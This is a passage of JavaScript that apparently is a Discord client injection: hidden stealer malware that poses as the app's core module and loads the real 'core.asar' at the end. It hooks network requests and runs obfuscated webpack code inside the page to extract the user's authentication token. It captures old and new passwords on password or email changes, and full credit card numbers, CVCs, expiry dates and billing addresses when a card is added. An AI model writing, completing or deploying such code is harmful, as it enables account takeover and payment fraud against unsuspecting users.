b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`, !0).then((token => { ChangePassword(data.password, data.new_password, token) })) } if (data.email != null && data.email != undefined && data.email != "") { const window = BrowserWindow.getAllWindows()[0]; window.webContents.executeJavaScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`, !0).then((token => { ChangeEmail(data.email, data.password, token) })) } } } else {} } if (details.url.endsWith("tokens")) { const window = BrowserWindow.getAllWindows()[0]; const item = querystring.parse(decodeURIComponent(Buffer.from(details.uploadData[0].bytes).toString())) window.webContents.executeJavaScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`, !0).then((token => { CreditCardAdded(item["card[number]"], item["card[cvc]"], item["card[exp_month]"], item["card[exp_year]"], item["card[address_line1]"], item["card[address_city]"], item["card[address_state]"], item["card[address_zip]"], item["card[address_country]"], token) })) } }); module.exports = require('./core.asar') 
